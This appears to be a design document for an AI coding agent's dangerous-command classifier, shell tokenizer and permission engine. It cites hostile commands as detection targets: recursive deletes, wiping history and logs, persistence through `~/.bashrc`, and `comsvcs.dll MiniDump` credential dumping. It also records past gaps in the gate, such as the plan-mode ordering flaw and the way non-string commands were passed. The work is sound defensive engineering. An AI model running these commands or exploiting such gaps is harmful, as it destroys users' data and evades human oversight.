That reversal is a decision this document records rather than hides. An earlier version of the source text excluded `iptables -F` and `ufw disable` on the grounds that a rule for them is written from the name. It was right that nothing was measured then. The `POSIX_PROTECTION_OFF` doc comment says the same thing about itself. What was wrong was to treat not measured as a disqualification. The Windows half flags the same act, and it got there without a measurement of the destruction either.

The function reads `truncate` first. The size comes from `-s` or `--size`, and the value must match `^[-+]?0+$`. The target is the first token after it that does not start with `-`. Otherwise a redirect regex `/> {1,2}\s*(\S+)/` is read off the segment text and not off the tokens. The spellings `>file` and `> file` do not have to be two words. That is the same reason the POSIX disk rule reads its segment. An operator of `>>` returns `null`. The target loses its quotes.

`isRecordPath` (`packages/agent/src/dangerous-command.ts:4230`) is a filename test and not a directory test, and it is deliberately narrow. Its words mark a record of what happened, and not a file somebody was at work in. `~/.bash_history` and `/var/log/auth.log` are records. `notes/log-ideas.md` is somebody's notes, and a flag on it is the kind of false positive that teaches a user to dismiss the whole classifier. The regexes are `(^|/)\.?(bash|zsh|sh|ksh)_history$`, `(^|/)\.python_history$`, `(^|/)\.node_repl_history$`, `(^|/)psql_history$`, `(^|/)mysql_history$`, `(^|/)\.mysql_history$`, `(^|/)\.psql_history$`, `^(/var/log/|/var/lib/.*/|/var/adm/)` and `(^|/)(auth\.log|syslog|messages|wtmp|btmp|utmp|lastlog|faillog)$`.

### Startup writes

`isStartupPath` (`packages/agent/src/dangerous-command.ts:4247`) reads a file the machine reads and acts on at the next login or boot. It is the opposite pole from `isRecordPath`, and the difference is worth an exact statement because it decides whether `>>` is a rule here. A history file records what happened, and an appended line to one changes nothing an attacker gains. That is why `posixRecordDestruction` returns early on `>>`. A startup file causes what happens next: one appended line to `~/.bashrc` is the whole attack, and `>>` is the operator every real example uses. `echo x > ~/.bashrc` is not more dangerous than `echo x >> ~/.bashrc`, because both install. So `>>` is caught here, against the measurement below and against the Windows half, where `isHistoryRedirect` also counts `>>` for the same reason.

The file is the shape, not the program. There is no narrow program to key on: `echo`, `printf`, `cat`, `tee` and `curl -o` all write these files and all are ordinary tools. So this is the `isRecordPath` idiom, a name test at the tail with a path boundary, rather than the `isRunKeyPath` one. That is the same asymmetry the Windows Run-key rule argues in its own comment. A match on the target keeps a rule away from a machine that is only set up in the ordinary way.

`/etc/profile.d/anything` is a directory rather than a fixed set of names. That is the one place this is looser than the rest, and deliberately: it is the documented way to add a machine-wide startup script. The files there exist to be added. `.config/autostart/*.desktop` is the same idea in the XDG spelling and is the closest thing POSIX has to the Windows Run key.

What this costs: a person who puts an alias in `~/.bashrc` does this, and so does every dotfile installer ever written. The prompt is the cost, and it is the same cost `SERVICE_INSTALL_VERBS` accepts. The line outlives the session, so whoever approved the command is not whoever lives with it.

Measured, and the control is what makes the measurement mean something. On a three-line file of 14 bytes, `printf 'extra\n' >> f` left 20 bytes with all three original lines intact, which is append and not destroy. The control is the same write with `>`: the file came back 4 bytes that hold only the new line. That is the difference between the two operators in `posixRecordDestruction`, and it is why this rule cannot reuse the history rule's early return.

The home file test is `(^|/)…$` and not a prefix. The spellings `~/.bashrc`, `$HOME/.zshrc`, `/home/dev/.profile` and `"~/.bash_profile"` all reduce to a name at the tail. And a prefix test also catches `~/.bashrc.example`. The names are `bashrc`, `bash_profile`, `bash_login`, `bash_logout`, `zshrc`, `zprofile`, `zshenv`, `zlogin`, `kshrc`, `cshrc` and `profile`, plus `config/fish/config.fish`. ### The `matchScript` loop and rejoined switch bundles

`matchScript` (`packages/agent/src/dangerous-command.ts:4633`) classifies a whole command line, one segment at a time. It is shared with the `eval` branch rather than written twice. After the segment loop, `fetchPipedIntoInterpreter` reads the whole script, and then `downloadedFileThenRun` reads the whole script too, because the pair spans two segments. Then the segment list is classified one segment at a time through `matchTokens`.

`;` is a CMD switch separator and a command separator on every other platform. So a Windows line that means it as the first arrives here already cut in two. `rejoinedSwitchSegments` (`packages/agent/src/dangerous-command.ts:4690`) puts the halves back together. The rejoined halves are read alongside the original segments and not in place of them. So a PowerShell `;` is still read as the separator it is.

The join was measured on real `del`, against a file that existed: `del /s;q /q a.txt` answers with its localized "file deleted" message and the file is gone. `;` is a switch separator in CMD. `dir /s;q *.txt` lists recursively, measured on the same machine. And it is also the separator `splitShellCommands` cuts on, which is right for POSIX and for PowerShell and wrong here. So the command arrives as `del /s` and `q /q C:\x\*`, and neither half carries both switches.

The join is made only where the join is a switch bundle and nothing else. The left side has to end in a token made of nothing but single-letter switches, and the right side has to open with bare letters. `Get-ChildItem; Remove-Item` fails the first test, a POSIX line never reaches here, and a `;` that satisfies neither is left exactly as `splitShellCommands` produced it. The halves are joined with `/` rather than with the `;` that was there. A `;` between switches means the same thing as a `/` between them. `del /s;q` is `del /s /q`, and a rejoin with `;` hands `tokenizeShell` the single token `/s;q`. That is a spelling it is right to refuse.

`continuesSwitchBundle` (`packages/agent/src/dangerous-command.ts:4704`) is the pair test. The last word of the left side starts with `/`, and is at least two characters long. Every `/`-separated piece after the first is a single letter or digit. The first word of the right side is bare letters. The main loop then reads `windows` lines as the union of the original segments and the rejoined segments, in that order, with duplicate segments removed.

### The shell scanner (`shell-tokens.ts`)

The shell scanner is shared by the two places that have to read a command line the way a shell does. These are the permission engine's Bash-to-file-rule extension, and the dangerous-command classifier. It was one function inside `permissions.ts` until the classifier needed the same read. A second copy is a second set of answers to "what are the words in this command". The failure mode is that a rule or a classification quietly applies to one tokenizer's idea of a command and not the other's.

`COMMAND_SEPARATOR_RE` (`packages/agent/src/shell-tokens.ts:6`) holds the shell metacharacters that separate one command from the next. `&` and `;` cover background jobs and command order, `|` a pipe, and a newline the same job `;` does. The two-character forms come first in the alternation so `&&` is not read as two `&`. **This does not know about quotes. To split a command line with it is wrong in a way that shows up as a false positive rather than a missed match.** `printf 'a;rm -rf /'` is one command that prints. Split with this rule it becomes two, and the second one is classified. Use `splitShellCommands`, which tracks quotes and backslash escapes. The constant stays exported because it also answers "which characters are separators", which is a question about the alphabet rather than about any one command.

`tokenizeShell` (`packages/agent/src/shell-tokens.ts:10`) splits one shell segment into tokens, keeps a quoted path with spaces as one token, and removes the quotes as the shell does. It is not a shell. It does no expansion, no substitution and no escape. A token it cannot read comes back as literal text, which is the safe direction for both callers. A rule that misses costs an approval prompt. And a command the classifier cannot decompose is one whose nested pieces it never got to look at.

`ShellSegment` (`packages/agent/src/shell-tokens.ts:42`) is one command of a command line together with the separator that ends it. `text` is the command's own text, trimmed, with its quote characters still on it. `separator` is `|`, `&&`, `||`, `;`, `&`, a newline, or `""` when the command ends the line. Only `|` moves bytes from the command on its left to the command on its right. Every other value means the second command starts fresh. So a caller that reasons about dataflow needs this field and not just the text. That is the whole reason `splitShellSegments` exists.

`splitShellSegments` (`packages/agent/src/shell-tokens.ts:52`) splits a command line into the separate commands it runs, and keeps each one's terminator. The scan tracks two things the regex it replaces did not, and both of them produced wrong answers rather than merely coarse ones.

- Quotes. `echo "a;rm -rf /"` is one command that prints six words. A split on the separator characters alone makes two, and the second is a forced recursive delete. So the classifier refused commands that print text with a semicolon in it. That is the sort of false positive that makes a user switch the thing off.
- Backslashes. A backslash quotes the character after it, so `find . -exec cmd \;` is one command whose argument is a semicolon. Split naively, the `\` at the tail was dropped and the segment lost its terminator.

A backslash inside single quotes is itself rather than an escape. That is the one rule here that does not generalise, and it is the reason this is a scanner and not a single lookbehind. The quote characters are left in each segment. `tokenizeShell` is what removes them. The segments keep their original text so a caller that shows one to a user shows what was actually typed.

The two-character forms are read as one. Whether they have to be is a question the empty-segment filter answers no: `a && b` split twice still comes out as `["a", "b"]`. The pair read is here because the loop moves a cursor. A read of one separator at a time leaves the cursor on the second `&` for no gain. The final filter drops every segment whose text is empty after a trim.

`splitShellCommands` (`packages/agent/src/shell-tokens.ts:105`) is the commands of a command line without their separators. That is the form most callers want: they ask what a line does, not how the pieces are joined. To drop the separator loses nothing for them. It is defined in terms of `splitShellSegments` so the scan is written once. The two drifted apart in an earlier revision. That is the sort of thing that shows up later, when one of them quietly answers a different question than the caller had in mind.

### The permission engine (`permissions.ts`)

The engine is pure: no I/O, no UI. Rule syntax is `Tool` or `Tool(specifier)`, for example `Bash`, `Bash(git *)`, `Bash(npm run *)`, `Edit(src/**)`, `Read(~/.ssh/*)`, `mcp__github` and `mcp__github__*`. The header of the file writes the order of the checks, and it calls the order a security property. Its numbered list places the classifier at step 2 and the plan-mode read-only list at step 3. The code and the in-function comments run them the other way round: the plan deny sits above the classifier. That is deliberate, for the reason recorded below.

The order the code actually runs:

- Deny rules, across every source. No mode and no sandbox setting reaches past them, because a rule the user wrote is a floor and not a preference. A file deny rule also covers shell commands that touch that file. Without it, Bash is an open bypass around every file deny rule the user configured. The denial names the path it caught.
- The plan-mode deny, for any tool that is not on the read-only list. It sits above the classifier and above the allow rules, for the same reason the deny rules do. An allow rule must not buy a write in a mode whose whole promise is that there are none.
- The dangerous-command classifier, for `Bash`, above every mode still in force and above the sandbox setting in both ways. A match is terminal: it returns there, so no allow rule below can turn it into a pass. A non-match grants nothing on its own, because it has no opinion. The decision carries on below, where an allow rule or `agent` mode can still say yes. That is the limit worth a statement: what the classifier does not recognise becomes an ordinary command. The rules below are what an ordinary command gets.
- Among allows, the first match decides, and there is deliberately no precedence between sources. Every allow produces the same answer, so which one matched is not observable. `RULE_SOURCE_ORDER` (`packages/agent/src/permissions.ts:48`) still fixes the order rules are collected in, because that is what makes a rule's reported source stable.
- The mode's own answer to "nothing decided it": `agent` runs it and `ask` brings it to a person.

Step one used to come after a `bypassPermissions` early return. That one mode was then the only thing in the system able to overrule a user's own `deny`. That line is gone. `deny-scan-first` was already written down as a security invariant in `.labunbun/skills/code-review-security/SKILL.md:8`, and the code was the thing that disagreed with it.

The classifier is a filter and not a gate, and the difference matters at the last step. A command the classifier does not recognise falls through to `agent` mode and runs. What the classifier buys is that the commands it does recognise stop there. It is not a whitelist, and nothing upstream treats its silence as safety.

The plan block carries the measurement that produced the hoist, and it had the mode backwards before the move. `Bash` is not in `PLAN_MODE_READ_ONLY_TOOLS`, so the plan check denies every shell command under `plan`. But the classifier returned first, and `decideDangerous` only made `agent` terminal, so `plan` fell through to `ask`. Measured with the engine called directly, before the move: `plan rm -rf /` answered `ask` with `Blocked as a dangerous command: \`rm\` with a force option`, while `plan git status` answered `deny` with `Plan mode: Bash is not allowed (read-only mode)`. The safe command was hard-denied and only the destructive one reached a human, in the one mode whose promise is no shell at all. To answer that dialog let a shell command run while the session was in plan mode. It took no user rule to reach, because the order alone did it. The hoist changes nothing else, and that is checked rather than hoped. The classifier is gated on `toolName === "Bash"`, and `Bash` is exactly what the plan check denies. So every other tool already arrived there with the same answer it gets now.

The fail-closed branch for an unreadable command says why it exists. A `command` that is not a string never reaches the function through the built-in Bash tool. The pipeline parses tool input against the tool's schema before it calls `canUseTool` (`pipeline.ts`, order zod safeParse, then validateInput, then beforeToolCall, then canUseTool). And the tool call already failed validation. But that guarantee lives in another file and is enforced by nothing that ties the two together. The other choice was to read `I could not find the command` as `the command is not dangerous`, which is the one inference this step must never make. A classifier that is not consulted cannot report a match. And an `agent`-mode call with no allow rule is then let through by the mode's own answer below. To relax the Bash schema from `z.string()` to `z.unknown()` is all it takes. Measured before the change: `evaluatePermissions("Bash", { command: 123 }, { mode: "agent", … })` returned `allow`, and so did `{ command: null }` and `{}`. So the answer is a deny with a message that says the call carries no readable string command and nothing can be classified. It is refused rather than treated as safe, and a call that is not shaped like a Bash call fails schema validation first.

`decideDangerous` (`packages/agent/src/permissions.ts:372`) reads what a classified command becomes, per mode. `ask` asks and says why: the reason is the only thing the dialog has that the model does not. So a bare `allow?` teaches a user to answer yes to the one prompt that needed a read. `agent` refuses outright, and that is what keeps `every call runs without asking` from a read as `every call runs, including the one that deletes the repository`. A mode that auto-approves everything has nothing left to protect a user with. So the commands that cannot be un-done are the ones it is not allowed to spend. The deny message ends with the statement that no permission mode runs this without an explicit rule that names it.

The config carries the two axes and two overrides:

- `sandbox` is read so the engine can refuse to widen access, not to decide anything. `danger-full-access` does not skip the classifier and does not skip the deny rules. The one thing `sandbox` does is tell the caller which policy to hand the process.
- `platform` names whose command semantics the classifier reads a Bash line with. It defaults to the current platform and is overridable, so both sets of rules are testable from one machine rather than one set skipped.

`evaluatePermissions` (`packages/agent/src/permissions.ts:274`) returns allow or deny when rules or modes decide, and returns ask when a human decision is needed. The caller at the app layer turns the asks that are left into a dialog, or into a deny when there is nobody to ask.

The file-deny extension across the shell is the reason `shell-tokens.ts` is shared. `extractBashFilePaths` (`packages/agent/src/permissions.ts:134`) exists so that a deny rule like `Read(**/.env)` also covers `Bash(cat .env)`. Without it, the shell is an open bypass around every file deny rule the user configured. It is deliberately defense-in-depth, and still not a sandbox: a shell can express file access in unbounded ways (`$(printf ...)`, variable indirection, `bash -c`, `eval`). So static extraction can always be evaded by someone who tries. The contract that keeps this safe to rely on is directional. Callers use the result only to deny, never to allow, and a failure to extract a path leaves the original decision untouched rather than widened.

What constrains a command today is not this function. The sandbox axis is enforced by seatbelt or bubblewrap on the platforms that have them, and by the tool-layer path policy where they do not. `describeSandboxBackend` says so out loud rather than leave it for the reader to assume. The per-command classifier sits above every mode and above the sandbox setting in both directions. Neither of those reaches a process that goes around the tools, which is the honest limit of the pair.

The extraction walks each segment. Redirections apply whatever program runs: `> f`, `>> f`, `< f`, `2> f` and the attached forms such as `>f`. They are read with the pattern `^\d*(?:>>|>|<)(.*)$`, where an attached value is the target and otherwise the next token is. A target that starts with `&` is not a path and is skipped. Then the positional arguments of the programs known to read files are read. The program name is the last path segment, with a `.exe` suffix removed and lower-cased, so `/bin/cat` and `cat` read alike. For those programs a token is skipped when it starts with `-`, when it is a redirection, or when it is a bare number. An example is `head -n 5`. `FILE_READING_COMMANDS` (`packages/agent/src/permissions.ts:111`) holds `cat`, `head`, `tail`, `less`, `more`, `type`, `strings`, `od`, `xxd`, `hexdump`, `base64`, `nl`, `tac`, `cp` and `install`.

`FILE_TOOL_NAMES` (`packages/agent/src/permissions.ts:169`) is the set of tools whose file deny rules a Bash command is also held to: `Read`, `Edit`, `Write` and `NotebookEdit`. The set is about rules a user wrote, not about the tools this build ships. `NotebookEdit` is named because the importer reads settings written for another tool that had one. A rule that protects a path has to protect it from the shell too. To drop the name quietly re-opens the path for every such rule. A name here that matches no tool costs nothing, and a name absent here costs the rule.

`bashHitsFileDenyRule` (`packages/agent/src/permissions.ts:175`) applies one deny rule to one Bash call and returns the path it caught so the denial can name it. `pathMatches` (`packages/agent/src/permissions.ts:227`) does the match. The file path and the specifier are normalized. The candidates are the absolute path, the lower-cased absolute path, the workspace-relative form when the path is under the cwd. And the `~` form when the path is under the home directory (`USERPROFILE` or `HOME`). The specifier becomes a regex with `specifierToRegExp` (`packages/agent/src/permissions.ts:87`). `**` crosses directories, `*` stays within one segment, `?` is one character that is not a slash. Everything else is escaped, and the whole pattern is anchored. `resolveCanonical` (`packages/agent/src/permissions.ts:223`) resolves the path against the cwd and collapses `.` and `..` segments, so a traversal sequence cannot defeat the string-prefix containment checks. `normalizePathSpec` turns Windows backslashes into slashes. `inputMatchesSpecifier` (`packages/agent/src/permissions.ts:187`) reads the input per tool. For `Bash` the wildcard match runs over the whole command line. `git *` matches any git invocation, `git push*` matches the prefixed forms, and plain text is an exact match. For the file tools it reads `file_path` or `notebook_path`. For MCP tools and unknown tools it matches the raw string form.

`mcpRuleMatches` (`packages/agent/src/permissions.ts:385`) covers the MCP spellings. MCP tools are named `mcp__<server>__<tool>`, and rules for them are written as bare tool names rather than `Tool(specifier)` form. The forms are `mcp__github` for a whole server, `mcp__github__*` for the same thing with a wildcard, and `mcp__github__create_issue` for one tool. Without this, all three fell through to the exact-equality check in `ruleMatches`. So only the fully spelled-out third form ever matched, and the server-wide forms were silently inert. A rule the user believed was in force did nothing at all.

`parseRuleText` (`packages/agent/src/permissions.ts:66`) parses the two rule forms and returns `null` when the text is malformed. It returns `null` for an empty string, a bare tool name with a stray `)`, or a specifier form that lacks the final `)`. The same holds for an empty tool name. `formatRule` (`packages/agent/src/permissions.ts:423`) writes a rule back as `Tool(specifier)` or `Tool`. `parseRuleList` (`packages/agent/src/permissions.ts:428`) reads a settings string array into rules with one behavior and one source, and drops the entries that do not parse.

`PLAN_MODE_READ_ONLY_TOOLS` (`packages/agent/src/permissions.ts:403`) is what plan mode still allows: the tools that only look at the world, and the one that only asks about it. It is a list of names, because this package is handed tool names and never tool objects. `Tool.isReadOnly` is the tools' own answer to the same question, and nothing here can read it, so the two are kept in step by hand. `plan-mode-allowlist.test.ts` walks the tool set the app actually builds and fails on any disagreement in either direction. That covers the reverse direction too, a name here that no tool answers to. A `TodoWrite` entry outlived the tool it named. And a mode that admits a tool nothing offers reads as a capability the user has and does not.

`AskUserQuestion` is on the list because to ask changes nothing, and plan mode is exactly where a guess is made otherwise. A plan built on an assumed goal costs the user a whole approval cycle to reject. `BandMessage` is here for the same shape of reason. It wakes and informs other sessions, and whatever a woken session then does is decided in that session under the same mode. So the bus cannot buy a write the mode promised does not exist. A bus left off the list is a whole subsystem silently switched off rather than gated. `WebFetch` and `WebSearch` are here for the same reason `Read` is: research that touches no file of the workspace. `Bash` is not, and that is the mode's promise: no shell at all, not even a read-only one. The list is exported for that test, because the reverse direction cannot be checked through `evaluatePermissions`. It answers `deny` for a name it does not know and `deny` for a tool that writes the same way.

The list: `Read`, `Grep`, `Glob`, `LS`, `BashOutput`, `WebFetch`, `WebSearch`, `TaskList`, `TaskGet`, `BandMessage`, `AskUserQuestion`, `EnterPlanMode` and `ExitPlanMode`.

## Why it is like this

The file is shaped by one question: what a wrong answer costs. A miss costs the data. A false positive costs a prompt, and a prompt is not free either. A user who meets many of them learns to answer them by reflex. The two costs are not equal, and every decision below picks one of the two on purpose.

The classifier is a pure function on purpose. It reads no file, runs no process, and opens no socket, so a classification is testable from a table of inputs alone. The same shape is what lets `permissions.ts` run it above every mode and every allow rule. The cost is small enough to pay on every `Bash` call.

The rules that shape membership:

- Every rule cites its source. A row was read from a manual page, a source file, or a measurement on a development machine, and the comment says which. A row read from source says so in words, because a reader must know the limit of the check.
- A measurement needs a control. The `chroot` probes are the case in point. A probe that answers the same under both hypotheses proves nothing. The record next to the rule keeps the failed probes so they are not tried again.
- A rule must not claim more than the real program does. PowerShell answers `AmbiguousParameter` for `-F` because `-Filter` takes the same letter, so the accepted set of force spellings starts at `-For`. A rule that accepted `-F` claims a delete PowerShell refuses to do.
- A rule left out costs the data, and a rule that is too wide costs a prompt. The asymmetry is deliberate, and the exclusions are written down in full. A limit that is not written down is a limit someone discovers by accident.
- A dry run is exempted, with the tool's own documentation as the source. `cargo publish -n` and `rsync --delete -n` are the questions a careful operator asks before the real run. To prompt on the question teaches the user that the prompt is noise. The exemption is written where the tool documents the switch.
- Wrappers are followed, not trusted. `sudo rm -rf /` and `rm -rf /` are the same command to the filesystem that will be harmed. So the classifier reads through the wrapper and does not stop at its name. The depth bound fails closed: a command eight wrappers deep becomes `Other`, which still reaches a dialog and never a pass.
- The prefix list answers one question: can the payload land in a different mount namespace or on a different host? `timeout` keeps the payload on this machine, so it is a prefix. `chroot` moves the root, so it is a carrier, and its payload is read against both platform grammars.
- The classifier sits above every mode and above the sandbox setting in both directions. An allow rule cannot turn it off, and the sandbox setting cannot either. The order is deliberate: the user's allow rule decides ordinary commands, and the classifier still runs first. A match is terminal, and a non-match grants nothing on its own.
- A design exists in which an `allow` prefix rule short-circuits the classifier, so the classifier runs only as a fallback. That is not what happens here, and the source warns against that correction. A match is a match.
- The classifier is not a sandbox, and the document says so. It reads one command line, and a program that goes around the tools never reaches it. Seatbelt and bubblewrap do the enforcement where they exist. The tool-layer path policy does it where they do not.
- Only the Windows side is simulated. The development machine cannot run a Windows payload. Those rules rest on Microsoft documentation, on measured switch spellings, and on what the local files can show. The UI copy states the limit rather than a claim the tests cannot support.
- Comments record the claims that were wrong, because a corrected claim that is not written down comes back. `## Known traps` collects them.

## Known traps

The list below collects the corrections that are written next to rules. So a claim that was wrong once does not come back as a fact.

- A comment can claim coverage the code does not have. `Unblock-File` was named in `powershellWeakeningRules` with no branch near it, so the list read as coverage while the code had none. The list and the code are now read against each other.
- One table for two acts hides the absent half. `SERVICE_STOP_VERBS` held the verbs that stop a service. The verbs that install one, `systemctl enable` among them, had no rule, and a single merged table made that asymmetry invisible. The fix is two tables, so a reader sees both halves.
- A rule can sit in plain sight and still be unreachable. `shutdown` and `procdump` have no verb to look up. The early `return null` on the verb table took their branch out of reach, so rules plainly in the file read NULL. The branch order is what fixed it.
- A branch that runs first can shadow a rule that comes later. `at` and `batch` stay out of the prefix list, because that branch runs first and finds nothing after `at`. It returns `null` before the rule for scheduled tasks is reached.
- A list read from a source goes stale. The kubectl sweep list was five entries, two of them wrong and one that did not exist. The current list was read again from `delete_flags.go`. A flag list that is copied once is a list nobody checks.
- "The same flags" was false for Compose. V1 is a Python binary parsed by docopt from its own docstrings and V2 is cobra and pflag, and their flag surfaces are nearly disjoint. The two versions have separate entries and separate tables.
- `--data-raw` reads backwards in its own help. `curl --help all` describes `--data-raw` as `'@' allowed`, and the sense a person takes from that line is that the file is sent. The measurement shows the opposite: `--data-raw` and `--form-string` each send their argument literally, so neither sends a file.
- An earlier comment contradicted the code next to it. One block said "only the soft separators are split here" while `SEGMENT_SEPARATORS` runs on the same pass. The comment now says what the code does.
- A claim about `ssh -Q` was wrong twice. Bare `ssh -Q` needs an argument and exits 255. The form `ssh -Q cipher 127.0.0.1 rm -rf /tmp/x` answers the query and exits 0 before the destination is resolved. The rule exists because of what was measured, not what the usage output looked like.
- Two claims about the carriers were wrong, and each cost a detection. A comment said `podman run`'s flags live in the wrong package. It also said `wsl`'s bare form does not hand the rest to a command, while `wsl rm -rf /` runs `rm -rf /`. Both claims are corrected in place.
- A dry run can be flagged as the act. `wipefs -n -a /dev/sda` is the question `what does this erase?`, and it was flagged for the erasure. Both dry-run spellings are now named, `-n` and `--no-act`, because `isDryRun` knows only `--dry-run` and the `-n` cluster shape.
- A platform qualifier left off a claim makes it false on one platform. An earlier comment made a `.exe` claim with no platform attached, which described only half of `executableName`. The suffix strip belongs to the Windows branch alone, and the asymmetry is measured in both directions.
- The spelling a machine's own files use is the one that matters. `executableName` strips `.exe`, `.cmd`, `.bat` and `.com` and not `.dll`. So `comsvcs.dll MiniDump ...` missed the `comsvcs` entry while `comsvcs MiniDump ...` was flagged. The retry block now reads a `.dll` name against that table only. The `rundll32` spelling was the same story: the carrier people type was the quiet one.
- A rule for a command that cannot run is the wrong kind of right. `kubectl exec pod rm -rf /` has no rule of its own. pflag keeps `argsLenAtDash` at `-1` when no literal `--` appears, so that line never reaches a container. A rule there claims a behavior the program does not have.
- A mutation that survives is a discovery, not noise. The `payload === ""` guard was deleted by a mutation and the suite stayed green, so the clause held nothing and was removed.
- The sentinel that made the source file binary. A sentinel word appended to a token list was a NUL byte. A NUL is a value no word can be, and it also made the file look binary to tools. The tail is checked by a separate call now.
- A stream measurement can measure the wrong stream. `Unblock-File` appeared to do nothing on a first measurement, because the before and after readings showed the same stream. It does not do nothing, and the record says to write the stream and to check for it before the act.
- A NUL check on a decoded string can miss every NUL. A first version looked for a NUL in the decoded string. A UTF-8 body read as UTF-16LE pairs two non-zero bytes and produces none, so the check missed it. The rule reads bytes now.
- To reason about a measured surface gets answers wrong. The PowerShell switch spellings were measured on 5.1 and 7.4, with a base64 body that writes a marker file only the body can write. A read of the prefixes alone gets two answers wrong. `-F` fails with `AmbiguousParameter` because `-Filter` is also an `F`, and `-foo` fails with `NamedParameterNotFound`.
- A regex over words is a guess where a measured set is a fact. `isDisablingParameter` stopped as a regex after a `Get-Command` run over 633 parameters, and three tries at the boundary were all wrong. `isDryRun`'s `-fn` cluster is the same lesson in a smaller shape. Measured: `-fn`, `-fnx` and `-nf` each exited 0, each printed a `Would remove` line, and each left the files on disk.
- git objects outlive the reflog by more than one prune. A commit orphaned by `reset --hard` survived one `gc --prune=now` and a second one. The rule states only what was measured.
- An omission is a decision and is written down. `--prune` removes only refs that are already gone on the local side, so a rule that claimed the refs themselves were the loss is wrong. The omission sits at the rule with its reason.
- The header of `permissions.ts` and the code order disagree about two steps. The header numbers the classifier at step 2 and the plan check at step 3, and the code runs the plan deny first. The code order is the one the engine follows, and the measured reason is in `## Behavior`.
- One block states a regex fact wrongly, and the pair stays in the file. The JSDoc of `isStartupFolderPath` says `\b` fires between the `p` and the `B` of `StartupBackup` and catches a folder at the same level. The comment inside the function corrects that: `\b` matches a word-to-non-word transition, so `\startup\b` misses that folder just the same. The regex uses `(?:\\|$)` on purpose.
